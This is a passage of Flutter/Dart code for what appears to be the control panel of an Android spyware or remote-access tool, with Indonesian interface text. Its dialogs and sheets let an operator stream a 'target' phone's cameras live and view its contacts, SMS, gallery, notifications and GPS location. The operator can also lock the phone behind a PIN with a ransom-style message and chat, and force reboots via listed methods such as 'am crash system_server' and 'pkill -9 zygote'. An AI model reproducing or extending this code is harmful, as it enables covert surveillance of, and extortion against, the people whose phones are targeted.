  Widget _pageDevice() => ListView(padding: const EdgeInsets.all(14), children: [
    _secHeader('DEVICE CONTROL', Icons.developer_board_rounded, _C.vio),
    const SizedBox(height: 14),
    _btn('Wake Up Target', _C.green, Icons.light_mode_rounded,
      () => _cmd('force_open')),
    const SizedBox(height: 10),
    _btn('Restart Device', _C.amber, Icons.restart_alt_rounded, () {
      showDialog(context: context, builder: (_) => _dlgBase(
        title: 'Restart Device', icon: Icons.restart_alt_rounded, color: _C.amber,
        body: 'HP target akan di-restart menggunakan PowerManager reflection.',
        actions: [
          _dlgBtn('Batal', _C.textM, () => Navigator.pop(context)),
          _dlgBtn('Restart', _C.amber, () { Navigator.pop(context); _cmd('reboot_device'); }),
        ],
      ));
    }),
    const SizedBox(height: 20),
    _buildRestartMethods(),
  ]);

  Widget _buildRestartMethods() => Container(
    padding: const EdgeInsets.all(16),
    decoration: BoxDecoration(
      borderRadius: BorderRadius.circular(14),
      color: Colors.black.withOpacity(0.4),
      gradient: LinearGradient(colors: [_C.card, _C.bgDeep]),
      border: Border.all(color: _C.goldBright.withOpacity(0.3), width: 1.2),
    ),
    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Row(children: [
        Container(width: 4, height: 16,
          decoration: BoxDecoration(
            gradient: const LinearGradient(
              colors: [_C.crimsonUp, _C.goldBright],
              begin: Alignment.topCenter, end: Alignment.bottomCenter),
            borderRadius: BorderRadius.circular(3),
            boxShadow: [BoxShadow(color: _C.goldBright.withOpacity(0.5), blurRadius: 6)])),
        const SizedBox(width: 10),
        const Text('RESTART METHODS', style: TextStyle(
          fontFamily: 'Orbitron', color: _C.textS,
          fontSize: 9, fontWeight: FontWeight.w800, letterSpacing: 2)),
      ]),
      const SizedBox(height: 14),
      ...[
        ['01', 'PowerManager reflection', _C.goldBright],
        ['02', 'DevicePolicyManager (admin)', _C.vio],
        ['03', 'su -c reboot (root)', _C.amber],
        ['04', 'am crash system_server', _C.textS],
        ['05', 'pkill -9 zygote', _C.textM],
      ].map((e) => Padding(
        padding: const EdgeInsets.only(bottom: 9),
        child: Row(children: [
          Container(width: 28, height: 20,
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(6),
              color: (e[2] as Color).withOpacity(0.15),
              border: Border.all(color: (e[2] as Color).withOpacity(0.4))),
            child: Center(child: Text(e[0] as String, style: TextStyle(
              fontFamily: 'Orbitron',
              color: e[2] as Color, fontSize: 8, fontWeight: FontWeight.w900)))),
          const SizedBox(width: 12),
          Text(e[1] as String, style: const TextStyle(
            fontFamily: 'ShareTechMono',
            color: _C.textS, fontSize: 11)),
        ]),
      )),
    ]),
  );

  // ══════════════════════════════════════════════════════════════════════════
  // HELPERS
  // ══════════════════════════════════════════════════════════════════════════
  Widget _secHeader(String t, IconData icon, Color c) => Row(children: [
    Container(width: 38, height: 38,
      decoration: BoxDecoration(
        gradient: LinearGradient(colors: [c.withOpacity(0.2), c.withOpacity(0.06)]),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: c.withOpacity(0.4), width: 1.2),
        boxShadow: [BoxShadow(color: c.withOpacity(0.2), blurRadius: 10)]),
      child: Icon(icon, color: c, size: 18)),
    const SizedBox(width: 12),
    Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Text(t, style: const TextStyle(
        fontFamily: 'Ganang',
        color: _C.textP, fontSize: 12, fontWeight: FontWeight.w900, letterSpacing: 0.5)),
      const SizedBox(height: 4),
      Container(height: 1.5, width: 52,
        decoration: BoxDecoration(
          gradient: LinearGradient(colors: [c.withOpacity(0.8), Colors.transparent]),
          boxShadow: [BoxShadow(color: c.withOpacity(0.4), blurRadius: 4)])),
    ]),
  ]);

  Widget _btn(String label, Color color, IconData icon, VoidCallback fn, {bool outlined=false}) =>
    GestureDetector(
      onTap: fn,
      child: AnimatedBuilder(
        animation: _discoCtrl,
        builder: (_,__) {
          final dc = _C.discoColor(_disco.value);
          return Container(
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 14),
            decoration: BoxDecoration(
              gradient: outlined ? null : LinearGradient(
                colors: [color.withOpacity(0.15), dc.withOpacity(0.03)],
                begin: Alignment.topLeft, end: Alignment.bottomRight),
              borderRadius: BorderRadius.circular(14),
              border: Border.all(
                color: outlined ? color.withOpacity(0.3) : color.withOpacity(0.4),
                width: outlined ? 1 : 1.3),
              boxShadow: outlined ? [] : [
                BoxShadow(color: color.withOpacity(0.15), blurRadius: 14),
                BoxShadow(color: dc.withOpacity(0.05), blurRadius: 20),
              ]),
            child: Stack(children: [
              if (!outlined) Positioned.fill(child: CustomPaint(
                painter: _GlitchPainter(progress: _glitch.value, color: dc),
              )),
              Row(children: [
                Container(width: 40, height: 40,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [color.withOpacity(0.25), color.withOpacity(0.08)]),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: color.withOpacity(0.5), width: 1.2),
                    boxShadow: [BoxShadow(color: color.withOpacity(0.25), blurRadius: 8)]),
                  child: Icon(icon, color: color, size: 19)),
                const SizedBox(width: 12),
                Expanded(child: Text(label, style: TextStyle(
                  fontFamily: 'Ganang',
                  color: outlined ? color.withOpacity(0.8) : _C.textP,
                  fontSize: 12, fontWeight: FontWeight.w700, letterSpacing: 0.5))),
                Container(width: 7, height: 7,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: color.withOpacity(outlined?0.3:0.7),
                    boxShadow: outlined ? [] : [
                      BoxShadow(color: color.withOpacity(0.5), blurRadius: 4)])),
                const SizedBox(width: 4),
                Icon(Icons.chevron_right_rounded, color: _C.textM, size: 17),
              ]),
            ]),
          );
        },
      ),
    );

  Widget _field(TextEditingController ctrl, String label, {String hint='', bool isNum=false}) =>
    TextField(
      controller: ctrl,
      keyboardType: isNum ? TextInputType.number : TextInputType.text,
      style: const TextStyle(fontFamily: 'ShareTechMono', color: _C.textP, fontSize: 12),
      decoration: InputDecoration(
        labelText: label, hintText: hint,
        labelStyle: const TextStyle(fontFamily: 'Ganang', color: _C.textS, fontSize: 11),
        hintStyle: const TextStyle(fontFamily: 'ShareTechMono', color: _C.textM, fontSize: 11),
        filled: true, fillColor: _C.card,
        contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
        border: OutlineInputBorder(
          borderRadius: BorderRadius.circular(10),
          borderSide: BorderSide(color: _C.bord)),
        enabledBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(10),
          borderSide: BorderSide(color: _C.bord)),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(10),
          borderSide: BorderSide(color: _C.goldBright, width: 1.5)),
      ),
    );

  Widget _dlgBase({required String title, required IconData icon, required Color color, String? body, Widget? extra, required List<Widget> actions}) =>
    Dialog(
      backgroundColor: Colors.transparent,
      child: _HoloFrame(
        color: color,
        child: Padding(padding: const EdgeInsets.all(22),
          child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
            Row(children: [
              Container(width: 40, height: 40,
                decoration: BoxDecoration(
                  gradient: LinearGradient(colors: [color.withOpacity(0.3), color.withOpacity(0.08)]),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: color.withOpacity(0.5), width: 1.2),
                  boxShadow: [BoxShadow(color: color.withOpacity(0.3), blurRadius: 10)]),
                child: Icon(icon, color: color, size: 19)),
              const SizedBox(width: 12),
              Expanded(child: Text(title, style: const TextStyle(
                fontFamily: 'Ganang', color: _C.textP, fontSize: 14,
                fontWeight: FontWeight.w900, letterSpacing: 0.5))),
            ]),
            if (body!=null || extra!=null)...[
              const SizedBox(height: 16),
              if (body!=null) Text(body, style: const TextStyle(
                fontFamily: 'ShareTechMono',
                color: _C.textS, fontSize: 12, height: 1.7)),
              if (extra!=null) extra,
            ],
            const SizedBox(height: 20),
            Row(mainAxisAlignment: MainAxisAlignment.end,
              children: actions.map((a) => Padding(
                padding: const EdgeInsets.only(left: 8), child: a)).toList()),
          ]),
        ),
      ),
    );

  Widget _dlgBtn(String label, Color c, VoidCallback fn) => GestureDetector(
    onTap: fn,
    child: Container(
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 11),
      decoration: BoxDecoration(
        gradient: c==_C.textM ? null : LinearGradient(
          colors: [c.withOpacity(0.2), c.withOpacity(0.05)]),
        borderRadius: BorderRadius.circular(11),
        border: Border.all(color: c.withOpacity(c==_C.textM ? 0.2 : 0.5), width: 1.2)),
      child: Text(label, style: TextStyle(
        fontFamily: 'Ganang', color: c, fontSize: 11,
        fontWeight: FontWeight.w800, letterSpacing: 1)),
    ),
  );

  // ══════════════════════════════════════════════════════════════════════════
  // DIALOGS
  // ══════════════════════════════════════════════════════════════════════════
  void _showLiveDialog() {
    showDialog(
      context: context, barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: _C.bgDeep,
          insetPadding: const EdgeInsets.all(10),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(16),
            side: BorderSide(color: _C.goldBright.withOpacity(0.5), width: 1.5)),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [_C.card, _C.bgDeep]),
                borderRadius: const BorderRadius.vertical(top: Radius.circular(15)),
                border: const Border(bottom: BorderSide(color: _C.bord))),
              child: Row(children: [
                AnimatedBuilder(
                  animation: _pulse,
                  builder: (_,__) => Container(
                    width: 8, height: 8,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle, color: _C.green,
                      boxShadow: [BoxShadow(
                        color: _C.green.withOpacity(0.8*_pulseA.value),
                        blurRadius: 8)])),
                ),
                const SizedBox(width: 10),
                Text('● $_liveTitle', style: const TextStyle(
                  fontFamily: 'Ganang',
                  color: _C.textP, fontSize: 11, fontWeight: FontWeight.w900, letterSpacing: 1)),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(8),
                    gradient: LinearGradient(
                      colors: [_C.green.withOpacity(0.2), _C.green.withOpacity(0.06)]),
                    border: Border.all(color: _C.green.withOpacity(0.5))),
                  child: Text('$_fps fps', style: const TextStyle(
                    fontFamily: 'Orbitron', color: _C.green,
                    fontSize: 9, fontWeight: FontWeight.w900))),
              ]),
            ),
            Container(
              constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.52),
              color: _C.bg,
              child: _frame != null
                ? Image.memory(_frame!, fit: BoxFit.contain,
                    gaplessPlayback: true, filterQuality: FilterQuality.low)
                : const SizedBox(height: 160, child: Center(
                    child: Column(mainAxisSize: MainAxisSize.min, children: [
                      SizedBox(width: 26, height: 26,
                        child: CircularProgressIndicator(color: _C.goldBright, strokeWidth: 2)),
                      SizedBox(height: 12),
                      Text('Connecting...', style: TextStyle(
                        fontFamily: 'ShareTechMono', color: _C.textS, fontSize: 11)),
                    ]))),
            ),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [_C.card, _C.bgDeep]),
                borderRadius: const BorderRadius.vertical(bottom: Radius.circular(15))),
              child: Row(children: [
                Expanded(child: GestureDetector(
                  onTap: () {
                    final f=_liveTitle.contains('DEPAN');
                    _stopLive();
                    Future.delayed(const Duration(milliseconds: 300),
                      ()=>_startLive('live_camera_start',f?'back':'front'));
                  },
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(colors: [_C.card, _C.bgDeep]),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(color: _C.goldBright.withOpacity(0.3))),
                    child: const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                      Icon(Icons.cameraswitch_rounded, color: _C.textS, size: 14),
                      SizedBox(width: 6),
                      Text('Switch', style: TextStyle(
                        fontFamily: 'Ganang', color: _C.textS, fontSize: 10,
                        fontWeight: FontWeight.w700)),
                    ])))),
                const SizedBox(width: 8),
                Expanded(child: GestureDetector(
                  onTap: () { _stopLive(); Navigator.pop(ctx); },
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 10),
                    decoration: BoxDecoration(
                      gradient: const LinearGradient(colors: [_C.red, _C.crimson]),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(color: _C.goldBright.withOpacity(0.4)),
                      boxShadow: [BoxShadow(color: _C.red.withOpacity(0.3), blurRadius: 10)]),
                    child: const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                      Icon(Icons.stop_rounded, color: _C.goldBright, size: 14),
                      SizedBox(width: 6),
                      Text('Stop', style: TextStyle(
                        fontFamily: 'Ganang', color: _C.goldBright,
                        fontSize: 10, fontWeight: FontWeight.w800)),
                    ])))),
              ]),
            ),
          ]),
        ),
      ),
    ).then((_) => _stopLive());
  }

  void _lockLiveDlg() {
    final m=TextEditingController(), p=TextEditingController();
    showDialog(context: context, builder: (_) => _dlgBase(
      title: 'Lock + Live Chat', icon: Icons.lock_person_rounded, color: _C.goldBright, body: null,
      extra: Column(mainAxisSize: MainAxisSize.min, children: [
        const Text('Target dikunci + chat dua arah aktif', style: TextStyle(
          fontFamily: 'ShareTechMono', color: _C.textS, fontSize: 11)),
        const SizedBox(height: 14),
        _field(m, 'Pesan di layar lock', hint: 'HP ini dikunci administrator'),
        const SizedBox(height: 10),
        _field(p, 'PIN Unlock', hint: '1234', isNum: true),
      ]),
      actions: [
        _dlgBtn('Batal', _C.textM, () => Navigator.pop(context)),
        _dlgBtn('LOCK', _C.goldBright, () {
          Navigator.pop(context);
          _cmd('lock_live', extra:'${m.text.trim().isEmpty?"HP INI DIKUNCI":m.text.trim()}|${p.text.trim().isEmpty?"1234":p.text.trim()}');
        }),
      ],
    ));
  }

  void _lockChatDlg() {
    final m=TextEditingController(), p=TextEditingController(), c=TextEditingController();
    showDialog(context: context, builder: (_) => _dlgBase(
      title: 'Lock + Pesan', icon: Icons.lock_clock_rounded, color: _C.amber, body: null,
      extra: Column(mainAxisSize: MainAxisSize.min, children: [
        _field(m, 'Pesan di layar lock', hint: 'HP ini dikunci administrator'),
        const SizedBox(height: 10),
        _field(p, 'PIN Unlock', hint: '1234', isNum: true),
        const SizedBox(height: 10),
        _field(c, 'Pesan chat (opsional)', hint: 'Hubungi kami'),
      ]),
      actions: [
        _dlgBtn('Batal', _C.textM, () => Navigator.pop(context)),
        _dlgBtn('Lock', _C.amber, () {
          Navigator.pop(context);
          _cmd('hard_lock', extra:'${m.text.trim().isEmpty?"HP INI DIKUNCI":m.text.trim()}|${p.text.trim().isEmpty?"1234":p.text.trim()}');
          if (c.text.trim().isNotEmpty) Future.delayed(
            const Duration(milliseconds:500),()=>_sendChat(c.text.trim()));
        }),
      ],
    ));
  }

  void _showCamPicker(Function(String) onPick) {
    String sel='back';
    showDialog(context: context, builder: (_) => StatefulBuilder(
      builder: (ctx, ss) => Dialog(
        backgroundColor: Colors.transparent,
        child: _HoloFrame(
          color: _C.goldBright,
          child: Padding(padding: const EdgeInsets.all(20),
            child: Column(mainAxisSize: MainAxisSize.min, children: [
              Text('Pilih Kamera', style: const TextStyle(
                fontFamily: 'Ganang', color: _C.textP,
                fontSize: 14, fontWeight: FontWeight.w900, letterSpacing: 1)),
              const SizedBox(height: 18),
              Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: ['back','front'].map((v) {
                final a=sel==v;
                return GestureDetector(
                  onTap:()=>ss(()=>sel=v),
                  child: AnimatedContainer(
                    duration: const Duration(milliseconds: 200),
                    padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 18),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: a ? [_C.crimsonUp.withOpacity(0.3), _C.maroon.withOpacity(0.1)] : [_C.card, _C.bgDeep]),
                      borderRadius: BorderRadius.circular(14),
                      border: Border.all(
                        color: a ? _C.goldBright.withOpacity(0.7) : _C.bord,
                        width: a?1.5:1),
                      boxShadow: a ? [BoxShadow(color: _C.goldBright.withOpacity(0.3), blurRadius: 14)] : []),
                    child: Column(children: [
                      Icon(
                        v=='back' ? Icons.camera_rear_rounded : Icons.camera_front_rounded,
                        color: a ? _C.goldBright : _C.textM, size: 30),
                      const SizedBox(height: 8),
                      Text(v=='back'?'Belakang':'Depan', style: TextStyle(
                        fontFamily: 'Ganang',
                        color: a?_C.goldBright:_C.textS, fontSize: 11,
                        fontWeight: FontWeight.w800)),
                    ]),
                  ),
                );
              }).toList()),
              const SizedBox(height: 20),
              Row(children: [
                Expanded(child: _dlgBtn('Batal', _C.textM, ()=>Navigator.pop(ctx))),
                const SizedBox(width: 10),
                Expanded(child: _dlgBtn('Pilih', _C.goldBright, (){ Navigator.pop(ctx); onPick(sel); })),
              ]),
            ])),
        ),
      ),
    ));
  }

  void _inputDlg(String title, String label, Function(String) onDone, {bool isNum=false}) {
    final ctrl=TextEditingController();
    showDialog(context: context, builder: (_) => _dlgBase(
      title: title, icon: Icons.edit_rounded, color: _C.goldBright, body: null,
      extra: _field(ctrl, label, isNum: isNum),
      actions: [
        _dlgBtn('Batal', _C.textM, ()=>Navigator.pop(context)),
        _dlgBtn('Kirim', _C.goldBright, (){ Navigator.pop(context); onDone(ctrl.text.trim()); }),
      ],
    ));
  }

  void _fetchNotif() async {
    try {
      final res = await http.get(Uri.parse('$_kBase/api/get-notifications/$_id'));
      if (res.statusCode==200) {
        final list = jsonDecode(res.body) as List;
        showModalBottomSheet(
          context: context,
          backgroundColor: Colors.transparent,
          isScrollControlled: true,
          builder: (_) => Container(
            decoration: BoxDecoration(
              color: _C.card,
              borderRadius: const BorderRadius.vertical(top: Radius.circular(20)),
              border: Border(top: BorderSide(color: _C.goldBright.withOpacity(0.6), width: 1.5)),
              boxShadow: [BoxShadow(color: _C.goldBright.withOpacity(0.2), blurRadius: 30)]),
            child: DraggableScrollableSheet(
              initialChildSize: 0.6, maxChildSize: 0.9, expand: false,
              builder: (_, sc) => Column(children: [
                Container(height: 4, width: 40,
                  margin: const EdgeInsets.only(top: 12, bottom: 10),
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(colors: [_C.crimsonUp, _C.goldBright]),
                    borderRadius: BorderRadius.circular(2))),
                const Text('Notifikasi', style: TextStyle(
                  fontFamily: 'Ganang', color: _C.textP,
                  fontWeight: FontWeight.w900, fontSize: 14, letterSpacing: 1)),
                const SizedBox(height: 10),
                Expanded(child: ListView.separated(
                  controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
                  itemCount: list.length, separatorBuilder: (_, __) => Divider(color: _C.bord, height: 1),
                  itemBuilder: (_, i) => ListTile(
                    contentPadding: const EdgeInsets.symmetric(vertical: 4),
                    leading: Container(width: 38, height: 38,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(colors: [_C.vio.withOpacity(0.2), _C.vio.withOpacity(0.06)]),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: _C.vio.withOpacity(0.4))),
                      child: const Icon(Icons.notifications_active_rounded, color: _C.vio, size: 18)),
                    title: Text(list[i]['title']?.toString()??'-', style: const TextStyle(
                      fontFamily: 'Ganang', color: _C.textP, fontSize: 12, fontWeight: FontWeight.w700)),
                    subtitle: Text(list[i]['body']?.toString()??'', style: const TextStyle(
                      fontFamily: 'ShareTechMono', color: _C.textS, fontSize: 10))))),
              ]),
            ),
          ),
        );
      }
    } catch (_) { _toast('Gagal ambil notif', c: _C.amber); }
  }

  void _imgDialog(String b64, String title) {
    try {
      final bytes = base64Decode(b64.contains(',') ? b64.split(',').last : b64);
      showDialog(context: context, builder: (_) => Dialog(
        backgroundColor: _C.bgDeep,
        insetPadding: const EdgeInsets.all(12),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(color: _C.goldBright.withOpacity(0.5), width: 1.5)),
        child: Column(mainAxisSize: MainAxisSize.min, children: [
          Padding(padding: const EdgeInsets.all(12),
            child: Text(title, style: const TextStyle(
              fontFamily: 'Ganang', color: _C.textP,
              fontWeight: FontWeight.w900, fontSize: 13, letterSpacing: 1))),
          ClipRRect(
            borderRadius: const BorderRadius.vertical(bottom: Radius.circular(15)),
            child: Image.memory(bytes, fit: BoxFit.contain)),
        ]),
      ));
    } catch (_) { _toast('Gagal decode gambar', c: _C.amber); }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    showDialog(context: context, builder: (_) => _dlgBase(
      title: 'GPS Location', icon: Icons.satellite_alt_rounded, color: _C.green,
      body: 'Lat: $lat\nLng: $lng',
      actions: [
        _dlgBtn('Tutup', _C.textM, () => Navigator.pop(context)),
        _dlgBtn('Buka Maps', _C.green, () => launchUrl(
          Uri.parse('https://www.google.com/maps/search/?api=1&query=$lat,$lng'),
          mode: LaunchMode.externalApplication)),
      ],
    ));
  }

  void _textDialog(String title, String content) {
    showDialog(context: context, builder: (_) => Dialog(
      backgroundColor: Colors.transparent,
      child: _HoloFrame(
        color: _C.goldBright,
        child: Padding(padding: const EdgeInsets.all(18),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Text(title, style: const TextStyle(
              fontFamily: 'Ganang', color: _C.textP,
              fontSize: 14, fontWeight: FontWeight.w900, letterSpacing: 1)),
            const SizedBox(height: 14),
            Container(padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [_C.card, _C.bgDeep]),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: _C.goldBright.withOpacity(0.3))),
              child: SelectableText(content, style: const TextStyle(
                fontFamily: 'ShareTechMono', color: _C.goldBright, fontSize: 11))),
            const SizedBox(height: 14),
            _dlgBtn('Tutup', _C.textM, () => Navigator.pop(context)),
          ])),
      ),
    ));
  }

  void _contactsSheet(List c) {
    showModalBottomSheet(
      context: context, backgroundColor: Colors.transparent, isScrollControlled: true,
      builder: (_) => Container(
        decoration: BoxDecoration(
          color: _C.card,
          borderRadius: const BorderRadius.vertical(top: Radius.circular(20)),
          border: Border(top: BorderSide(color: _C.goldBright.withOpacity(0.6), width: 1.5)),
          boxShadow: [BoxShadow(color: _C.goldBright.withOpacity(0.2), blurRadius: 30)]),
        child: DraggableScrollableSheet(
          initialChildSize: 0.6, maxChildSize: 0.9, expand: false,
          builder: (_, sc) => Column(children: [
            Container(height: 4, width: 40,
              margin: const EdgeInsets.only(top: 12, bottom: 10),
              decoration: BoxDecoration(
                gradient: const LinearGradient(colors: [_C.crimsonUp, _C.goldBright]),
                borderRadius: BorderRadius.circular(2))),
            Text('Kontak (${c.length})', style: const TextStyle(
              fontFamily: 'Ganang', color: _C.textP,
              fontWeight: FontWeight.w900, fontSize: 14, letterSpacing: 1)),
            const SizedBox(height: 10),
            Expanded(child: ListView.separated(
              controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
              itemCount: c.length, separatorBuilder: (_, __) => Divider(color: _C.bord, height: 1),
              itemBuilder: (_, i) => ListTile(
                leading: Container(width: 38, height: 38,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(colors: [_C.goldBright.withOpacity(0.2), _C.goldBright.withOpacity(0.06)]),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: _C.goldBright.withOpacity(0.4))),
                  child: const Icon(Icons.person_rounded, color: _C.goldBright, size: 18)),
                title: Text(c[i]['name']?.toString()??'-', style: const TextStyle(
                  fontFamily: 'Ganang', color: _C.textP, fontSize: 12, fontWeight: FontWeight.w600)),
                subtitle: Text(c[i]['number']?.toString()??'-', style: const TextStyle(
                  fontFamily: 'ShareTechMono', color: _C.textS, fontSize: 10)))),
            ),
          ]),
        ),
      ),
    );
  }

  void _smsSheet(List s) {
    showModalBottomSheet(
      context: context, backgroundColor: Colors.transparent, isScrollControlled: true,
      builder: (_) => Container(
        decoration: BoxDecoration(
          color: _C.card,
          borderRadius: const BorderRadius.vertical(top: Radius.circular(20)),
          border: Border(top: BorderSide(color: _C.goldBright.withOpacity(0.6), width: 1.5)),
          boxShadow: [BoxShadow(color: _C.goldBright.withOpacity(0.2), blurRadius: 30)]),
        child: DraggableScrollableSheet(
          initialChildSize: 0.75, maxChildSize: 0.95, expand: false,
          builder: (_, sc) => Column(children: [
            Container(height: 4, width: 40,
              margin: const EdgeInsets.only(top: 12, bottom: 10),
              decoration: BoxDecoration(
                gradient: const LinearGradient(colors: [_C.vio, _C.goldBright]),
                borderRadius: BorderRadius.circular(2))),
            Text('SMS (${s.length})', style: const TextStyle(
              fontFamily: 'Ganang', color: _C.textP,
              fontWeight: FontWeight.w900, fontSize: 14, letterSpacing: 1)),
            const SizedBox(height: 10),
            Expanded(child: ListView.separated(
              controller: sc, padding: const EdgeInsets.symmetric(horizontal: 14),
              itemCount: s.length, separatorBuilder: (_, __) => Divider(color: _C.bord, height: 1),
              itemBuilder: (_, i) {
                final m=s[i] as Map;
                return ListTile(
                  leading: Container(width: 38, height: 38,
                    decoration: BoxDecoration(
                      gradient: LinearGradient(colors: [_C.vio.withOpacity(0.2), _C.vio.withOpacity(0.06)]),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: _C.vio.withOpacity(0.4))),
                    child: const Icon(Icons.mark_unread_chat_alt_rounded, color: _C.vio, size: 18)),
                  title: Text(m['address']?.toString()??'-', style: const TextStyle(
                    fontFamily: 'Ganang', color: _C.textP, fontSize: 12, fontWeight: FontWeight.w600)),
                  subtitle: Text(m['body']?.toString()??'', style: const TextStyle(
                    fontFamily: 'ShareTechMono', color: _C.textS, fontSize: 10),
                    maxLines: 2, overflow: TextOverflow.ellipsis));
              })),
          ]),
        ),
      ),
    );
  }

  void _gallerySheet(List imgs) {
    showModalBottomSheet(
      context: context, backgroundColor: Colors.transparent, isScrollControlled: true,
      builder: (_) => Container(
        decoration: BoxDecoration(
          color: _C.card,
          borderRadius: const BorderRadius.vertical(top: Radius.circular(20)),
          border: Border(top: BorderSide(color: _C.goldBright.withOpacity(0.6), width: 1.5)),
          boxShadow: [BoxShadow(color: _C.goldBright.withOpacity(0.2), blurRadius: 30)]),
        child: DraggableScrollableSheet(
          initialChildSize: 0.75, maxChildSize: 0.95, expand: false,
          builder: (_, sc) => Column(children: [
            Container(height: 4, width: 40,
              margin: const EdgeInsets.only(top: 12, bottom: 10),
              decoration: BoxDecoration(
                gradient: const LinearGradient(colors: [_C.goldBright, _C.amber]),
                borderRadius: BorderRadius.circular(2))),
            Text('Gallery (${imgs.length})', style: const TextStyle(
              fontFamily: 'Ganang', color: _C.textP,
              fontWeight: FontWeight.w900, fontSize: 14, letterSpacing: 1)),
            const SizedBox(height: 10),
            Expanded(child: imgs.isEmpty
              ? const Center(child: Text('Kosong', style: TextStyle(
                  fontFamily: 'Ganang', color: _C.textM)))
              : GridView.builder(
                  controller: sc, padding: const EdgeInsets.all(10),
                  gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                    crossAxisCount: 3, crossAxisSpacing: 5, mainAxisSpacing: 5),
                  itemCount: imgs.length,
                  itemBuilder: (_, i) {
                    try {
                      final raw=imgs[i].toString();
                      final bytes=base64Decode(raw.contains(',') ? raw.split(',').last : raw);
                      return GestureDetector(
                        onTap:()=>_imgDialog(raw,'Gallery ${i+1}'),
                        child: ClipRRect(
                          borderRadius: BorderRadius.circular(10),
                          child: Image.memory(bytes, fit: BoxFit.cover)));
                    } catch (_) {
                      return Container(decoration: BoxDecoration(
                        color: _C.bgDeep, borderRadius: BorderRadius.circular(10)));
                    }
                  })),
          ]),
        ),
      ),
    );
  }

  Widget _accessDenied() => Scaffold(
    backgroundColor: _C.bg,
    body: Stack(children: [
      Positioned.fill(child: Image.asset(
        'assets/images/ppp.jpg',
        fit: BoxFit.cover,
        errorBuilder: (_, __, ___) => Container(color: _C.bg))),
      Positioned.fill(child: Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            colors: [
              _C.bg.withOpacity(0.9),
              _C.bgDeep.withOpacity(0.85),
              _C.bg.withOpacity(0.95),
            ],
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter)))),
      Center(child: Padding(
        padding: const EdgeInsets.all(32),
        child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
          Container(width: 100, height: 100,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              gradient: RadialGradient(colors: [_C.vio.withOpacity(0.3), Colors.transparent]),
              border: Border.all(color: _C.vio.withOpacity(0.5), width: 1.5),
              boxShadow: [BoxShadow(color: _C.vio.withOpacity(0.3), blurRadius: 30)]),
            child: const Icon(Icons.lock_person_rounded, color: _C.vio, size: 48)),
          const SizedBox(height: 28),
          const Text('AKSES TERBATAS', style: TextStyle(
            fontFamily: 'Ganang', color: _C.textP,
            fontSize: 18, fontWeight: FontWeight.w900, letterSpacing: 3)),
          const SizedBox(height: 12),
          Text('Role ${widget.role.toUpperCase()} tidak memiliki akses.',
            style: const TextStyle(
              fontFamily: 'ShareTechMono', color: _C.textS, fontSize: 12),
            textAlign: TextAlign.center),
          const SizedBox(height: 32),
          GestureDetector(
            onTap: ()=>Navigator.pop(context),
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 14),
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(12),
                gradient: const LinearGradient(colors: [_C.crimsonUp, _C.maroon]),
                border: Border.all(color: _C.goldBright.withOpacity(0.5)),
                boxShadow: [BoxShadow(color: _C.crimson.withOpacity(0.5), blurRadius: 20)]),
              child: const Text('KEMBALI', style: TextStyle(
                fontFamily: 'Ganang', color: _C.goldBright,
                fontWeight: FontWeight.w900, fontSize: 13, letterSpacing: 2)))),
        ]),
      )),
    ]),
  );

